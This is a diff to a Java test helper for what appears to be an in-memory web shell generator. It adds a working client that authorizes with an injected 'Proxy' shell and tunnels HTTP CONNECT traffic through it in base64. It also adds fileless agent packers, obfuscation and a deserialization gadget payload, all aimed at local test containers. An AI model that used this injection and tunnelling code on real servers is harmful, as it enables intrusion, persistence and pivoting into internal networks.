@@ -18,6 +18,7 @@ import com.reajason.javaweb.memshell.shelltool.behinder.BehinderConfig;
 import com.reajason.javaweb.memshell.shelltool.command.CommandConfig;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
 import com.reajason.javaweb.memshell.shelltool.neoreg.NeoreGeorgConfig;
+import com.reajason.javaweb.memshell.shelltool.proxy.ProxyConfig;
 import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Config;
 import com.reajason.javaweb.packer.ClassPackerConfig;
 import com.reajason.javaweb.packer.JarPacker;
@@ -25,14 +26,22 @@ import com.reajason.javaweb.packer.JarPackerConfig;
 import com.reajason.javaweb.packer.Packer;
 import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.packer.jar.*;
+import com.reajason.javaweb.packer.jar.agent.AgentJarPacker;
+import com.reajason.javaweb.packer.jar.agent.AgentJarWithJDKAttacherPacker;
+import com.reajason.javaweb.packer.jar.agent.AgentJarWithJREAttacherPacker;
 import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
+import com.reajason.javaweb.probe.ProbeContent;
+import com.reajason.javaweb.probe.ProbeMethod;
+import com.reajason.javaweb.probe.config.ProbeConfig;
 import com.reajason.javaweb.suo5.Suo5Manager;
 import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
 import net.bytebuddy.jar.asm.Opcodes;
 import okhttp3.HttpUrl;
+import okhttp3.MediaType;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
+import okhttp3.RequestBody;
 import okhttp3.Response;
 import com.reajason.javaweb.utils.RandomUtils;
 import com.reajason.javaweb.utils.StringUtils;
@@ -42,10 +51,15 @@ import org.testcontainers.containers.Container;
 import org.testcontainers.containers.GenericContainer;
 import org.testcontainers.utility.MountableFile;
 
+import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
+import java.util.Base64;
 import java.util.Objects;
 
 import static com.reajason.javaweb.memshell.ShellTool.*;
@@ -101,7 +115,7 @@ public class ShellAssertion {
     public static MemShellResult shellInjectIsOk(String url, String server, String serverVersion, String shellType, String shellTool,
                                                  int targetJdkVersion, String packer,
                                                  GenericContainer<?> appContainer, GenericContainer<?> pythonContainer) {
-        if (ShellTool.Proxy.equals(shellTool)) {
+        if (ShellTool.Proxy.equals(shellTool) && shellType.endsWith(ShellType.WEBSOCKET)) {
             return null;
         }
         Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
@@ -166,7 +180,7 @@ public class ShellAssertion {
             String bytes = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
             content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
         } else {
-            content = PackerRegistry.getInstance().get(packer).pack(ClassPackerConfig.from(generateResult));
+            content = PackerRegistry.getInstance().pack(packer, generateResult);
         }
         injectIsOk(url, shellType, shellTool, content, packer, appContainer);
         log.info("send inject payload successfully");
@@ -252,10 +266,106 @@ public class ShellAssertion {
             case AntSword:
                 antSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
                 break;
+            case Proxy:
+                proxyIsOk(shellUrl, appContainer, ((ProxyConfig) generateResult.getShellToolConfig()));
+                break;
             case NeoreGeorg:
                 neoreGeorgIsOk(appContainer, pythonContainer, shellUrl, ((NeoreGeorgConfig) generateResult.getShellToolConfig()));
                 break;
         }
+    }
+
+    private static void proxyIsOk(String shellUrl, GenericContainer<?> appContainer, ProxyConfig config) throws Exception {
+        URL url = new URL(shellUrl);
+        String targetHost = "127.0.0.1";
+        int targetPort;
+        if (appContainer == null || appContainer.getExposedPorts().isEmpty()) {
+            targetHost = url.getHost();
+            targetPort = url.getPort() < 0 ? url.getDefaultPort() : url.getPort();
+        } else {
+            targetPort = appContainer.getExposedPorts().get(0);
+        }
+
+        String token = null;
+        // Netty injection only affects new channels; never reuse a pre-injection keep-alive connection.
+        OkHttpClient client = new OkHttpClient();
+        Response pull = null;
+        try {
+            Request authorizeRequest = proxyRequest(config, shellUrl, "").get().build();
+            try (Response authorize = client.newCall(authorizeRequest).execute()) {
+                String authorization = authorize.body().string();
+                assertTrue(authorize.code() == 200 && authorization.startsWith("token="),
+                        "Proxy authorize failed: " + authorize.code() + " " + authorization);
+                token = authorization.substring("token=".length());
+            }
+
+            String connect = "CONNECT " + targetHost + ":" + targetPort + " HTTP/1.1\r\n\r\n";
+            assertTrue(proxyPush(client, shellUrl, token, config, connect.getBytes(StandardCharsets.ISO_8859_1)) == 200,
+                    "Proxy CONNECT push failed");
+            pull = client.newCall(proxyRequest(config, shellUrl, token).get().build()).execute();
+            assertTrue(pull.code() == 200, "Proxy pull failed: " + pull.code());
+            BufferedReader reader = new BufferedReader(new InputStreamReader(
+                    pull.body().byteStream(), StandardCharsets.US_ASCII));
+            String established = nextProxyLine(reader);
+            assertTrue(established != null && new String(Base64.getDecoder().decode(established),
+                            StandardCharsets.ISO_8859_1).startsWith("HTTP/1.1 200"),
+                    "Proxy CONNECT was not established");
+
+            String request = "GET / HTTP/1.1\r\nHost: " + targetHost + "\r\nConnection: close\r\n\r\n";
+            assertTrue(proxyPush(client, shellUrl, token, config, request.getBytes(StandardCharsets.ISO_8859_1)) == 200,
+                    "Proxy payload push failed");
+            ByteArrayOutputStream targetResponse = new ByteArrayOutputStream();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (!line.isEmpty()) {
+                    byte[] data = Base64.getDecoder().decode(line);
+                    targetResponse.write(data, 0, data.length);
+                }
+            }
+            assertTrue(new String(targetResponse.toByteArray(), StandardCharsets.ISO_8859_1).contains("HTTP/"),
+                    "Proxy target returned no HTTP response");
+        } finally {
+            if (pull != null) {
+                pull.close();
+            }
+            if (token != null) {
+                try {
+                    proxyPush(client, shellUrl, token, config, new byte[0]);
+                } catch (Throwable ignored) {
+                }
+            }
+            client.connectionPool().evictAll();
+        }
+    }
+
+    private static String nextProxyLine(BufferedReader reader) throws IOException {
+        String line;
+        while ((line = reader.readLine()) != null) {
+            if (!line.isEmpty()) {
+                return line;
+            }
+        }
+        return null;
+    }
+
+    private static int proxyPush(OkHttpClient client, String shellUrl, String token, ProxyConfig config, byte[] data) throws IOException {
+        RequestBody body = RequestBody.create(Base64.getEncoder().encode(data),
+                MediaType.parse("application/octet-stream"));
+        Request request = proxyRequest(config, shellUrl, token).post(body).build();
+        try (Response response = client.newCall(request).execute()) {
+            int code = response.code();
+            if (code != 200) {
+                throw new IOException("Proxy push failed: HTTP " + code + " " + response.body().string());
+            }
+            return code;
+        }
+    }
+
+    private static Request.Builder proxyRequest(ProxyConfig config, String shellUrl, String token) {
+        String endpoint = shellUrl + (shellUrl.contains("?") ? "&" : "?") + "token=" + token;
+        return new Request.Builder().url(endpoint)
+                .header("Connection", "close")
+                .header(config.getHeaderName(), config.getHeaderValue());
     }
 
     private static void neoreGeorgIsOk(GenericContainer<?> container, GenericContainer<?> pythonContainer, String shellUrl, NeoreGeorgConfig shellToolConfig) throws Exception {
@@ -389,6 +499,13 @@ public class ShellAssertion {
                         .build();
                 log.info("generated {} NeoreGeorg with Referer: {}", shellType, uniqueName);
                 break;
+            case Proxy:
+                shellToolConfig = ProxyConfig.builder()
+                        .headerName("User-Agent")
+                        .headerValue(uniqueName)
+                        .build();
+                log.info("generated {} proxy with User-Agent: {}", shellType, uniqueName);
+                break;
         }
         return shellToolConfig;
     }
@@ -470,6 +587,7 @@ public class ShellAssertion {
             case Packers.XMLDecoderScriptEngine, Packers.XMLDecoderDefineClass -> VulTool.postIsOk(url + "/xmlDecoder", content);
             case Packers.XSLT, Packers.XSLTScriptEngine -> VulTool.postIsOk(url + "/xslt", content);
             case Packers.DefaultBase64 -> VulTool.postIsOk(url + "/b64", content);
+            case Packers.FilelessAgent -> VulTool.postRawIsOk(url + "/b64", content);
             case Packers.BigInteger -> VulTool.postIsOk(url + "/biginteger", content);
             case Packers.XxlJob -> VulTool.xxlJobExecutor(url + "/run", content);
             case Packers.XxlJobHessian -> VulTool.xxlJobHessianExecutor(url + "/", content);
@@ -496,7 +614,10 @@ public class ShellAssertion {
                 .shellTool(shellTool)
                 .targetJreVersion(targetJdkVersion)
                 .debug(true)
-                .probe(true)
+                .probe(ProbeConfig.builder()
+                        .probeMethod(ProbeMethod.ResponseBody)
+                        .probeContent(ProbeContent.Bytecode)
+                        .build())
                 .lambdaSuffix(true)
                 .obfuscation(ObfuscationConfig.enabled())
                 .build();
